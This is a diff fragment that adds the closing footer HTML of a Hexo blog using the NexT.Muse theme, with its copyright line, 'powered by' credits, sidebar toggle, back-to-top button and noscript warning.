+    &copy; 2019 – 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">pcl</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
